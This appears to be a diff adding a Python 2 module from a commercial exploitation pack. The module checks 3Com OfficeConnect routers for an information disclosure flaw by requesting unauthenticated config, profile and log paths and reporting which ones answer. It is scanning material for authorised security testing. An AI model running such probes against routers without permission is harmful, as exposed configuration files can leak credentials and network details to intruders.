@@ -1,0 +1,44 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_3com_4'
+_vendor_ = '3com'
+_model_  = ['3Com OfficeConnect']
+_vuln_   = 'Information Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  files = ['/SaveCfgFile.cgi',
+    '/main/config.bin',
+    '/main/profile.wlp?PN=ggg',
+    '/main/event.logs']
+  for u in files:
+    try:
+      url = "http://%s%s" % (host, u)
+      print "[#] %s :" % url,
+      response = requests.get(url)
+    except Exception, e:
+      print 'error (%s)' % e
+      return
+    if response.status_code != 200:
+      print 'not vulnerable'
+    else :
+      print 'vulnerable' 
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
